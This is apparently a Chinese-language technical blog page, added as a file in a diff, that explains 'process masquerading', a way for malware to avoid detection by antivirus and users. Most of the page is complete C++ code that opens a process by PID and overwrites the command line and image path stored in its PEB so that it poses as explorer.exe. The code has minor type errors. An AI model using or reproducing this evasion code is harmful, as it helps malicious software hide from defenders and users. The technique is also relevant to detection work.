@@ -1,0 +1,74 @@
+<!DOCTYPE html><html lang="en"><head><title>进程伪装</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
+  document.body.classList.add('mobile')
+}</script><div><div class="inner"><h2>进程伪装</h2><h3 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h3><p>恶意文件在主机上为了避免被杀软或者是用户发现，从而可以使用进程伪装来改变文件启动时的命令行信息以及程序名称。</p>
+<h3 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h3><p>主要就是修改了文件的peb种的ProcessParameters结构体(_RTL_USER_PROCESS_PARAMETERS)中的ImagePathName和CommandLine这两个UNICODE_STRING结构体。主要要更改结构体中的buffer和length。</p>
+<p><strong>此技术可以在win7上实现成功，但在win10上不行。</strong></p>
+<pre><code class="cpp">#include&lt;stdio.h&gt;
+#include&lt;windows.h&gt;
+#include&lt;winternl.h&gt;
+//此程序win7可用，win10不可用
+
+
+typedef NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)(
+    IN HANDLE ProcessHandle,
+    IN PROCESSINFOCLASS ProcessInformationClass,
+    OUT PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength,
+    OUT PULONG ReturnLength OPTIONAL
+    );
+
+
+bool DisguiseProcess(DWORD pid, LPCWSTR szCmdLine, LPCWSTR szProgName)
+&#123;
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (NULL == hProc)
+    &#123;
+        printf(&quot;获取进程句柄失败!\n&quot;);
+        return -1;
+    &#125;
+    typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
+    PEB peb;
+    PROCESS_BASIC_INFORMATION pbi = &#123; 0 &#125;;
+    RTL_USER_PROCESS_PARAMETERS param = &#123; 0 &#125;;
+    NtQueryInformationProcess = (typedef_NtQueryInformationProcess)::GetProcAddress(::LoadLibrary(L&quot;ntdll.dll&quot;),
+        &quot;NtQueryInformationProcess&quot;);
+    NTSTATUS status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &amp;pbi, sizeof(pbi), NULL);
+    if (!NT_SUCCESS(status))
+    &#123;
+        printf(&quot;获取进程信息失败!\n&quot;);
+        return -1;
+    &#125;
+
+    ReadProcessMemory(hProc, pbi.PebBaseAddress, &amp;peb, sizeof(peb), NULL);
+    ReadProcessMemory(hProc, peb.ProcessParameters, &amp;param, sizeof(param), NULL);
+
+    SIZE_T nCmdLineLen = wcslen(szCmdLine) * 2 + 2;
+    WriteProcessMemory(hProc, param.CommandLine.Buffer, szCmdLine, nCmdLineLen, NULL);
+    WriteProcessMemory(hProc, &amp;param.CommandLine.Length, &amp;nCmdLineLen, sizeof(nCmdLineLen), NULL);
+
+    SIZE_T nProgLen = wcslen(szProgName) * 2 + 2;
+    WriteProcessMemory(hProc, param.ImagePathName.Buffer, szProgName, nProgLen, NULL);
+    WriteProcessMemory(hProc, &amp;param.ImagePathName.Length, &amp;nProgLen, sizeof(nProgLen), NULL);
+    return TRUE;
+&#125;
+
+
+int main()
+&#123;
+    DWORD pid;
+    printf(&quot;请输入要伪装的进程pid:&quot;);
+    scanf_s(&quot;%d&quot;, &amp;pid);
+    if (!DisguiseProcess(pid, L&quot;C:\\explorer.exe&quot;, L&quot;explorer.exe&quot;))
+    &#123;
+        printf(&quot;进程伪装失败!\n&quot;);
+        return -1;
+    &#125;
+    printf(&quot;进程伪装成功...\n&quot;);
+    return 0;
+
+&#125;
+</code></pre>
+</div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js?v=1"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-0000"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-0000');</script></html>
